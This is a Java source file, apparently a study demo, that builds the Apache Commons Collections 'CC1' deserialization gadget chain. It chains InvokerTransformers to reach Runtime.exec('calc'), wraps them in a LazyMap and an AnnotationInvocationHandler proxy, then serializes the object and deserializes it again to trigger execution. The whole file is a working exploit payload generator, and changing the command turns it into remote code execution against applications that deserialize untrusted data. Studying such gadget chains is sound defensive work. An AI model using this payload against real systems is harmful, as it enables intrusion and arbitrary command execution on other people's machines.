import com.sun.org.apache.xml.internal.security.transforms.Transform;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import sun.util.resources.cldr.zh.CalendarData_zh_Hans_HK;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.instrument.ClassDefinition;
import java.lang.reflect.*;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;


public class demo1 {
    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, IOException, NoSuchFieldException {

        Transformer[] transformer = new Transformer[]{    
              new ConstantTransformer(Runtime.class),     //结果作为后一个的输出
              new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
              new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
              new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);
//        chainedTransformer.transform(1);


        HashMap<Object,Object> hash = new HashMap<Object, Object>();
        hash.put("value","value");
//        Map<Object,Object> transmap = TransformedMap.decorate(hash,null,chainedTransformer);
//        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//        Constructor constructor = c.getDeclaredConstructor(Class.class,Map.class);
//        constructor.setAccessible(true);
//        Object o = constructor.newInstance(Target.class, decorateMap);
        Map<Object,Object> lazymap = LazyMap.decorate(hash,chainedTransformer);
        lazymap.get("key");



      Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

        Constructor constructor = c.getDeclaredConstructor(Class.class,Map.class);

        constructor.setAccessible(true);
        InvocationHandler instance = (InvocationHandler) constructor.newInstance(Target.class,lazymap);
        Map proxyInstance = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},instance);
        Object o = constructor.newInstance(Override.class,proxyInstance);
//
        serialize(o);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        objectOutputStream.writeObject(obj);

    }
    public static Object unserialize(String name) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(name));
        Object o1 = objectInputStream.readObject();
        return o1;



    }
}
